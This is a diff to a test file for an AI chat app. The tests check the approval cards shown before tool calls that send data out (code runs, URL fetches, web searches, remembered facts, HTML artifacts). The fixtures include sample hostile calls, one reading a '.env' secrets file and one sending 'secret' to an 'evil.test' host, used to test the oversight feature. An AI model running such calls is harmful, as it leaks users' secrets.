@@ -6,6 +6,8 @@ import {
   waitingPlanCallId,
   denyOpenApprovals,
   approvalTitle,
+  approvalDetails,
+  waitsForApproval,
   STOPPED_REPLY,
 } from "@/lib/utils/messageParts";
 import { AGENT_DELIVERED } from "@/lib/utils/agentLink";
@@ -145,5 +147,40 @@ describe("shouldAutoContinue for sendToChat", () => {
 
   it("waits while the send is still pending", () => {
     expect(shouldAutoContinue([send("input-available")] as any)).toBe(false);
+  });
+});
+
+describe("approval card for tools that send data out", () => {
+  it("approval card shows the code, URL and query in the block for executeCode, fetchUrl and webSearch", () => {
+    const code = approvalDetails("executeCode", { language: "python", code: "print(open('.env').read())" });
+    expect(code.block).toEqual([{ text: "print(open('.env').read())" }]);
+    expect(code.rest).toEqual([["language", "python"]]);
+    expect(approvalDetails("fetchUrl", { url: "https://evil.test/?d=secret" }).block).toEqual([{ text: "https://evil.test/?d=secret" }]);
+    expect(approvalDetails("webSearch", { query: "secret token" }).block).toEqual([{ text: "secret token" }]);
+    expect(approvalDetails("rememberFact", { key: "k", value: "the fact", category: "profile" }).block).toEqual([{ text: "the fact" }]);
+  });
+
+  it("an HTML page asks with its HTML in the block, in a chat that asks before sending data out", () => {
+    expect(approvalTitle("createArtifact", { type: "html", title: "Page" }, true)).toBe("Create an HTML page");
+    expect(approvalTitle("updateArtifact", { artifactId: "a" }, true)).toBe('Update artifact "a"');
+    expect(approvalTitle("createArtifact", { type: "html", title: "Page" })).toBe('Create artifact "Page"');
+    expect(approvalDetails("createArtifact", { type: "html", title: "Page", content: "<b>x</b>" }).block).toEqual([{ text: "<b>x</b>" }]);
+  });
+
+  it("titles the calls the way UX 3.10 lists them", () => {
+    expect(approvalTitle("executeCode", { language: "javascript" })).toBe("Run JavaScript code");
+    expect(approvalTitle("executeCode", { language: "python" })).toBe("Run Python code");
+    expect(approvalTitle("fetchUrl", { url: "https://a.test/x" })).toBe("Fetch https://a.test/x");
+    expect(approvalTitle("webSearch", { query: "cats" })).toBe('Search the web for "cats"');
+    expect(approvalTitle("rememberFact", { key: "k" })).toBe("Remember a fact for other chats");
+  });
+});
+
+describe("waitsForApproval", () => {
+  it("is true only for a call the server marked sendsOut, so the browser does not run it on arrival", () => {
+    expect(waitsForApproval({ toolMetadata: { sendsOut: true, folder: "app" } })).toBe(true);
+    expect(waitsForApproval({ toolMetadata: { sendsOut: true } })).toBe(true);
+    expect(waitsForApproval({ toolMetadata: {} })).toBe(false);
+    expect(waitsForApproval({})).toBe(false);
   });
 });
